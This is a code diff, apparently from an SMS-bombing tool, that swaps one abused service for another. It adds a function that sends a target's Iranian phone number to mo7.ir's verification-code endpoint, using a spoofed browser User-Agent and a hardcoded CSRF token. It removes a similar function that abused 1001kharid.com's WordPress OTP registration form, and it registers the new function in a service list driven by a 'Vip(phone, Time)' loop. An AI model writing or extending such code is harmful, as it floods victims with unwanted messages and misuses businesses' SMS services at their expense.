@@ -54,7 +54,41 @@ def check_internet():
 # ------------------------------
 
 
-
+def mo7_ir(phone):
+    import requests
+    
+    formatted_phone = "0" + phone.replace("+98", "")
+    url = "https://mo7.ir/bakala/ajax/send_code/"
+    
+    payload = {
+        "action": "bakala_send_code",
+        "phone_email": formatted_phone
+    }
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "X-CSRF-TOKEN": "b5ea5c0516",
+        "X-Requested-With": "XMLHttpRequest",
+        "Origin": "https://mo7.ir",
+        "Referer": "https://mo7.ir/",
+    }
+    
+    try:
+        response = requests.post(url, data=payload, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            print(f'{g}(mo7_ir) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (mo7_ir) HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] mo7_ir Exception: {e}{a}')
+        return False
+        
 
 def dgshahr(phone):
     import requests
@@ -90,67 +124,6 @@ def dgshahr(phone):
         print(f'{r}[!] dgshahr Exception: {e}{a}')
         return False
 
-
-def kharid1001(phone):
-    import requests
-    import re
-    
-    digits_phone = phone.replace("+98", "")
-    formatted_phone = f"{digits_phone[:3]}+{digits_phone[3:6]}+{digits_phone[6:]}"
-    
-    try:
-        session = requests.Session()
-        home_response = session.get("https://www.1001kharid.com/", timeout=10)
-        
-        # استخراج instance_id
-        instance_id = re.search(r'name="instance_id" value="([a-f0-9]+)"', home_response.text)
-        instance_id = instance_id.group(1) if instance_id else "e0edf6e657fff0a6ddbb3983694747ed"
-        
-        url = "https://www.1001kharid.com/wp-admin/admin-ajax.php"
-        
-        payload = {
-            "digt_countrycode": "+98",
-            "phone": formatted_phone,
-            "email": "",
-            "digits_process_register": "1",
-            "sms_otp": "",
-            "digits_otp_field": "1",
-            "instance_id": instance_id,
-            "optional_data": "optional_data",
-            "action": "digits_forms_ajax",
-            "type": "register",
-            "dig_otp": "sms_otp",
-            "digits": "1",
-            "digits_redirect_page": "//www.1001kharid.com/?page=1&redirect_to=https%3A%2F%2Fwww.1001kharid.com%2F",
-            "digits_form": "e07c70774c",
-            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fwww.1001kharid.com%2F",
-            "otp_resend": "true",
-            "container": "digits_protected",
-            "sub_action": "sms_otp"
-        }
-        
-        headers = {
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "X-Requested-With": "XMLHttpRequest",
-            "Origin": "https://www.1001kharid.com",
-            "Referer": "https://www.1001kharid.com/",
-        }
-        
-        response = session.post(url, data=payload, headers=headers, timeout=10)
-        
-        if response.status_code == 200:
-            response_data = response.json()
-            if response_data.get("success") is True:
-                print(f'{g}(1001kharid) {a}Code Sent')
-                return True
-        
-        print(f'{r}[-] (1001kharid) Failed{a}')
-        return False
-            
-    except Exception:
-        print(f'{r}[-] (1001kharid) Failed{a}')
-        return False
 
 
 def torobpay(phone):
@@ -428,7 +401,7 @@ def Vip(phone, Time):
     torobpay,
     malltina,
     dgshahr,
-    kharid1001,  # جایگزین yektanet
+    mo7_ir,  # جایگزین 1001kharid
 ]
     total_services = len(services)
 
